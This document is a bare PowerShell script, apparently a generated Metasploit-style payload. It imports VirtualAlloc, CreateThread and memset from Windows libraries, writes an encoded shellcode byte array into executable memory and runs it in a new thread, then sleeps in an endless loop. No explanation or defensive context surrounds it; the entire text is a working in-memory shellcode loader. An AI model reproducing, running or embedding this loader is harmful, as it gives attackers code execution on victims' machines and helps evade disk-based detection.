$Hg41Eh = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Hg41Eh -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xfb,0x70,0xcc,0x4e,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x03,0x7a,0x13,0x83,0xc2,0xff,0x92,0x39,0xb2,0x17,0xd0,0xc2,0x4b,0xe7,0xb5,0x4b,0xae,0xd6,0xf5,0x28,0xba,0x48,0xc6,0x3b,0xee,0x64,0xad,0x6e,0x1b,0xff,0xc3,0xa6,0x2c,0x48,0x69,0x91,0x03,0x49,0xc2,0xe1,0x02,0xc9,0x19,0x36,0xe5,0xf0,0xd1,0x4b,0xe4,0x35,0x0f,0xa1,0xb4,0xee,0x5b,0x14,0x29,0x9b,0x16,0xa5,0xc2,0xd7,0xb7,0xad,0x37,0xaf,0xb6,0x9c,0xe9,0xa4,0xe0,0x3e,0x0b,0x69,0x99,0x76,0x13,0x6e,0xa4,0xc1,0xa8,0x44,0x52,0xd0,0x78,0x95,0x9b,0x7f,0x45,0x1a,0x6e,0x81,0x81,0x9c,0x91,0xf4,0xfb,0xdf,0x2c,0x0f,0x38,0xa2,0xea,0x9a,0xdb,0x04,0x78,0x3c,0x00,0xb5,0xad,0xdb,0xc3,0xb9,0x1a,0xaf,0x8c,0xdd,0x9d,0x7c,0xa7,0xd9,0x16,0x83,0x68,0x68,0x6c,0xa0,0xac,0x31,0x36,0xc9,0xf5,0x9f,0x99,0xf6,0xe6,0x40,0x45,0x53,0x6c,0x6c,0x92,0xee,0x2f,0xf8,0x57,0xc3,0xcf,0xf8,0xff,0x54,0xa3,0xca,0xa0,0xce,0x2b,0x66,0x28,0xc9,0xac,0x89,0x03,0xad,0x23,0x74,0xac,0xce,0x6a,0xb2,0xf8,0x9e,0x04,0x13,0x81,0x74,0xd5,0x9c,0x54,0xe0,0xd0,0x0a,0x97,0x5d,0xdb,0xc9,0x7f,0x9c,0xdc,0xcc,0xc4,0x29,0x3a,0x9e,0x6a,0x7a,0x93,0x5e,0xdb,0x3a,0x43,0x36,0x31,0xb5,0xbc,0x26,0x3a,0x1f,0xd5,0xcc,0xd5,0xf6,0x8d,0x78,0x4f,0x53,0x45,0x19,0x90,0x49,0x23,0x19,0x1a,0x7e,0xd3,0xd7,0xeb,0x0b,0xc7,0x8f,0x1b,0x46,0xb5,0x19,0x23,0x7c,0xd0,0xa5,0xb1,0x7b,0x73,0xf2,0x2d,0x86,0xa2,0x34,0xf2,0x79,0x81,0x4f,0x3b,0xec,0x6a,0x27,0x44,0xe0,0x6a,0xb7,0x12,0x6a,0x6b,0xdf,0xc2,0xce,0x38,0xfa,0x0c,0xdb,0x2c,0x57,0x99,0xe4,0x04,0x04,0x0a,0x8d,0xaa,0x73,0x7c,0x12,0x54,0x56,0x7c,0x6e,0x83,0x9e,0x0a,0x9e,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RqT=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RqT.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RqT,0,0,0);for (;;){Start-sleep 60};